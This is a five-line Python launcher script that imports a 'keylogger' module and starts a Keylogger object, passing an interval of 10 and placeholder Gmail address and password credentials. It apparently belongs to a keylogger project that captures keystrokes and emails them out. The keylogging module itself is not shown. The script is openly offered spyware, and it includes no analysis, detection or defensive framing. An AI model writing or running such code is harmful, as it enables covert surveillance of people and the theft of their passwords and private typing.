#!/usr/bin/env python
import keylogger

my_keylogger = keylogger.Keylogger(10, "your_email@gmail.com", "your_email_password!")
my_keylogger.start()